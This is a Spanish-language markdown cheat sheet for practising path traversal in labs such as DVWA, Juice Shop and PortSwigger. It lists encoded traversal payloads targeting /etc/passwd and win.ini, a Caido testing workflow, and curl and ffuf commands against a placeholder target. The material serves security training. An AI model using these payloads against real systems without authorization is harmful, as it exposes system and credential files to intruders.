<div align="center">

# 📁 Path Traversal
### Lectura Arbitraria de Archivos del Sistema

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-Path%20Traversal-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **Path Traversal:** manipulación de parámetros que contienen rutas de archivo para leer archivos arbitrarios fuera del directorio raíz de la aplicación.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Parámetros Sospechosos](#-parámetros-sospechosos) |
| 04 | [🧪 Payloads Base](#-payloads-base) |
| 05 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 06 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 07 | [🧠 Objetivos Comunes en Labs](#-objetivos-comunes-en-labs) |
| 08 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 09 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | File Inclusion |
| **Juice Shop** | Local File Read |
| **PortSwigger** | Path traversal |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-ffuf-ff6b00?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `Replay`, `Automate` |
| **ffuf** | Fuzzing automático de rutas y variantes |
| **curl** | Reproducción rápida de payloads |

---

## 🔍 Parámetros Sospechosos

![Context](https://img.shields.io/badge/Detección-Parámetros-ff6b00?style=flat-square)

Parámetros con nombres que sugieren manejo de archivos:

- `file=`
- `page=`
- `path=`
- `template=`
- `download=`
- `img=`
- `folder=`

> [!TIP]
> Buscar en `HTTP History` requests con extensiones de archivo en el valor del parámetro: `.html`, `.php`, `.png`, `.pdf`. Son candidatos directos.

---

## 🧪 Payloads Base

![Context](https://img.shields.io/badge/Payload-Traversal%20Sequences-a855f7?style=flat-square)

### `[01]` Básico

```text
../../../../etc/passwd
..\..\..\..\windows\win.ini
```

### `[02]` URL encoding

```text
..%2f..%2f..%2f..%2fetc%2fpasswd
```

### `[03]` Doble encoding

```text
..%252f..%252f..%252f..%252fetc%252fpasswd
```

### `[04]` Unicode / overlong

```text
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

> [!NOTE]
> Probar siempre payload sin encode primero. Si está bloqueado, escalar a URL encode, doble encode y variantes Unicode.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Capturar request

Localizar request con nombre de archivo o ruta en parámetro.

### `[02]` Replay con archivo esperado

Confirmar que el archivo legítimo carga correctamente como baseline.

### `[03]` Sustituir por payload

Reemplazar valor por secuencia traversal:

```text
../../../../etc/passwd
```

### `[04]` Revisar respuesta

Buscar en body:

- contenido de `/etc/passwd` (Linux)
- contenido de `win.ini` (Windows)
- errores de path del servidor

### `[05]` Automate con wordlist

```text
../../../../etc/passwd
../../../../etc/hosts
..\..\..\..\windows\win.ini
```

> [!IMPORTANT]
> Si el servidor devuelve error genérico sin contenido, probar con variantes encoded. Un error diferente al normal ya indica impacto.

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

```bash
curl -i "http://target/image?filename=../../../../etc/passwd"
```

![Tool](https://img.shields.io/badge/Tool-ffuf-ff6b00?style=flat-square)

```bash
ffuf -u "http://target/load?file=FUZZ" -w traversal.txt
```

---

## 🧠 Objetivos Comunes en Labs

| Linux | Windows |
|-------|---------|
| `/etc/passwd` | `C:\Windows\win.ini` |
| `/etc/hosts` | `C:\Windows\System32\drivers\etc\hosts` |
| Configs de app | `web.config` |

---

## 🧭 Ruta de Práctica

1. DVWA File Inclusion
2. PortSwigger: simple path traversal
3. PortSwigger: stripped traversal sequences
4. PortSwigger: superfluous URL decode
5. Juice Shop: local file read

---

## 📝 Checklist

- [ ] parámetro de archivo controlado identificado
- [ ] path absoluto/relativo del servidor inferido
- [ ] bypass de encoding probado
- [ ] archivo sensible leído en lab
